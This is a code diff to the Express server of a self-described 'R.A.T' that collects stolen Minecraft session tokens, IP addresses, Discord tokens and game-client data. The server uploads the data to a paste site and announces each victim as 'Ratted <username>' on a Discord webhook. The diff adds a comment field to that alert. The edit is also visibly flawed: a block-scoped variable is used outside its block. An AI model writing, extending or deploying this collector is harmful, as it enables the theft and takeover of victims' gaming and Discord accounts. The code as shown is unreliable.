@@ -43,7 +43,7 @@ setInterval(() => {
 //main route, post to this
 app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
-    if (!["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord", "type].every(field => req.body.hasOwnProperty(field))) {
+    if (!["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord", "type"].every(field => req.body.hasOwnProperty(field)) || !["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord"].every(field => req.body.hasOwnProperty(field))) {
         console.log("[R.A.T] Rejected malformed JSON")
         return res.sendStatus(404)
     }
@@ -92,6 +92,10 @@ app.post("/", (req, res) => {
             }
 
             if (usingDiscord) {
+		if (req.body.type) {
+			const comment = req.body.type
+		}
+		
                 //upload feather
                 const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => { return { data: { key: "Error uploading" } } })).data.key
 
@@ -159,7 +163,7 @@ app.post("/", (req, res) => {
 
                 try {
                     post(process.env.WEBHOOK, JSON.stringify({
-                        content: `@everyone - <t:${timestamp}:R>`, //ping
+                        content: `@everyone - ${comment} - <t:${timestamp}:R>`, //ping
                         embeds: [{
                             title: `Ratted ${req.body.username} - Click For Stats`,
                              fields: [
